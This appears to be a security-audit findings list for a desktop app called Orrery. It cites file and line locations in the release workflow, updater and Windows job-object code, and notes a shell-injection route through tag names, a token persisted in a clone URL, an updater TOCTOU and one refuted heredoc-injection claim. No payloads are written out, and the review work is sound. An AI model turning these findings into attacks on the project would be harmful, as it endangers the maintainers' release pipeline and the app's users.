- `pnpm-workspace.yaml:12-19` **`minimumReleaseAgeExclude` is configured but `minimumReleaseAge` is never set, so the cooldown it exempts from does not exist** — pnpm-workspace.yaml:11-19 explains that the exclusion exists because 'the minimum-release-age rule (aimed at catching freshly-published malicious versions of third-party deps) has nothing to protect against' for the authors' own packages.
- `render.yaml:34-45` **Landing site sets no CSP, HSTS or frame-ancestors on the installer download page** — render.yaml:34-45 enumerates every header the static site sets: X-Content-Type-Options, Referrer-Policy and two Cache-Control rules.
- `src-tauri/target-test/.rustc_info.json:1` **374 tracked cargo build artifacts under src-tauri/target-test, including 24 PE executables and 24 pdbs that fingerprint the maintainer's machine** — `git ls-files src-tauri/target-test | wc -l` = 374, added whole in commit 8b26c17 (2026-08-04).
- `.github/workflows/release.yml:63-68` **github.ref_name is interpolated into a shell script; git tag names may contain quotes and command substitution** — release.yml:64 expands the untrusted ref name directly into the script text: `tag="${{ github.ref_name }}"; tag="${tag#v}"`.
- `.github/workflows/release.yml:70-77` **GITHUB_OUTPUT heredoc uses a static delimiter fed by attacker-influenceable commit subjects** — release.yml:73-77 writes `notes<<NOTES_EOF`, then the stdout of scripts/release/notes.mjs, then `NOTES_EOF`.
- `.github/workflows/release.yml:144` **The publish job — which generates the trust manifest and holds RELEASES_TOKEN — checks out a moving ref, while the build job pins the exact SHA** — release.yml:93-95 deliberately pins the builder: `- uses: actions/checkout@v6` `with: ref: ${{ needs.prepare.outputs.sha }}`, with the comment at release.yml:35-37 explaining that both builders must check out the exact SHA prepare resolved. _(added by verifier)_
- `.github/workflows/release.yml:205-224` **RELEASES_TOKEN is embedded in a clone URL and persisted to .git/config on the runner** — release.yml:205 (and publish-changelog.yml:49) clone with the credential inline: `git clone --depth 1 "https://x-access-token:${RELEASES_TOKEN}@github.com/kouji-dev/orrery-releases.git" releases-repo`.
- `src-tauri/src/runtime/jobobj.rs:177` **JOB_OBJECT_LIMIT_BREAKAWAY_OK is granted job-wide for the updater stub's sake, so any descendant — including an agent — can leave the kill-on-close job; the code asserts the opposite** — assign_current_process_to_kill_on_close_job (jobobj.rs:158-196) sets LimitFlags to KILL_ON_JOB_CLOSE | BREAKAWAY_OK on the single job that holds Orrery and every process it spawns. _(added by verifier)_
- `src-tauri/src/update.rs:45-47` **Selecting the beta channel silently stops all update checks — the derived latest-beta.json is never published and the 404 is collapsed into 'no update'** — `beta_url` rewrites the configured endpoint to `.../latest-beta.json` (update.rs:45-47) and `build_updater` swaps the endpoint list for it (update.rs:75-79).
- `src-tauri/src/update.rs:212-236` **Signature-verified installer is staged at a fixed %TEMP% path and executed later by a stub that re-verifies nothing (same-user TOCTOU; no privilege gained)** — update.rs:212-218 stages `%TEMP%\orrery-updater.exe` and `%TEMP%\Orrery_{version}_update.{msi|exe}` at constant paths, spawns the stub (update.rs:232-236) and exits (update.rs:241).
- `src-tauri/updater-stub/src/main.rs:195-204` **The stub is left in %TEMP% forever and is a general-purpose "silently run this file behind an Orrery update banner" primitive** — The Done handler deletes only the package (main.rs:196) — the staged stub copied at update.rs:213-214 is never removed by either process, so it accumulates permanently.

## Rejected on verification (1)

Listed so the reader can see what was considered and why it was dropped.

- `.github/workflows/release.yml:70-77` Commit subjects are written into $GITHUB_OUTPUT with a fixed heredoc delimiter, allowing output injection from a commit message — **refuted**: The sink is quoted correctly (release.yml:72-77 uses the constant delimiter NOTES_EOF), and using a fixed heredoc delimiter is against GitHub's guidance. But the attack is not reachable, because the value piped into it cannot contain the delimiter on its own line.

scripts/release/notes.mjs:34 collects subjects with `out('log', '--no-merges', '--pretty=%s', range).split('\n')` — `%s` is the commit *subject*, i.e. the first line only, so no element can carry an embedded newline. buildNotes (notes.mjs:10-15) then maps every surviving element through ``.map((s) => `- ${s}`)`` and joins with '\n'. Every line of stdout therefore begins with the literal `- `. A commit subject of exactly `NOTES_EOF` emits the line `- NOTES_EOF`, which GitHub's parser does not treat as the closing delimiter (it requires an exact match on its own line). There is no input to notes.mjs that produces a bare `NOTES_EOF` line, so neither the arbitrary-output-injection nor the DoS materialises. Worth doing as hygiene, but it is not a defect with a failure scenario, and the finder's stated precondition ('a commit whose subject line is exactly NOTES_EOF') provably does not produce the effect. The far more consequential injection in the same job is the shell-level one at release.yml:64, which the finder did not report — see secrets-ci-repo-hygiene-missed-02.
